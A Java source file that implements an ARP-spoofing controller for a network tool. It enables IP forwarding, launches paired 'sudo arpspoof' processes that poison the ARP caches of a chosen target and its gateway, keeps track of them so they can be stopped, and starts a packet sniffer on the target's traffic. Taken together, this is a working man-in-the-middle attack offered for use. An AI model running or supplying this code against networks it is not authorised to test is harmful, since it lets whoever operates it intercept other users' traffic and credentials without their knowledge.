package org.npt.networkservices.defaults;

import lombok.extern.slf4j.Slf4j;
import org.npt.networkservices.ArpSpoofStarter;
import org.npt.services.impl.ProcessExecuter;

import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;

@Slf4j
public class ArpSpoofStarterImpl implements ArpSpoofStarter {

    private static final String COMMAND = "sudo arpspoof -i %s -t %s %s";
    private static final String PROCESS_NAME = "Spoofing the following Target : %s , Gateway : %s";
    private static final List<ProcessExecuter> processExecuters = new ArrayList<>();
    private static ArpSpoofStarterImpl instance = null;

    private ArpSpoofStarterImpl() {
        ProcessExecuter.execute("Enable IP Forwarding", new String[]{"sudo sysctl -w net.ipv4.ip_forward=1"}, false);
    }

    public void stopSpoofing(String targetIp, String gatewayIp) {
        final String processName = ProcessExecuter.ProcessUtils.generateProcessNameFrom(String.format(PROCESS_NAME, targetIp, gatewayIp));
        final List<ProcessExecuter> filteredProcessExecuted = processExecuters
                .stream()
                .filter(processExecuter -> processExecuter.getProcessName().equals(processName))
                .collect(Collectors.toCollection(ArrayList::new));
        filteredProcessExecuted.forEach(processExecuter -> {
            processExecuter.stop();
            processExecuters.remove(processExecuter);
        });
    }

    public void startSpoofing(String scanInterface, String targetIp, String gatewayIp) {
        final String commandFirst = String.format(COMMAND, scanInterface, targetIp, gatewayIp);
        final String commandSecond = String.format(COMMAND, scanInterface, gatewayIp, targetIp);
        String processName = String.format(PROCESS_NAME, targetIp, gatewayIp);
        processName = ProcessExecuter.ProcessUtils.generateProcessNameFrom(processName);
        final ProcessExecuter normal = ProcessExecuter.execute(processName, new String[]{commandFirst}, false);
        final ProcessExecuter reverse = ProcessExecuter.execute(processName, new String[]{commandSecond}, false);
        processExecuters.add(normal);
        processExecuters.add(reverse);
        PacketSniffer packetSniffer = new PacketSniffer(targetIp);
        packetSniffer.startSniffing();
    }

    public static ArpSpoofStarterImpl getInstance() {
        if (instance == null)
            instance = new ArpSpoofStarterImpl();
        return instance;
    }

}
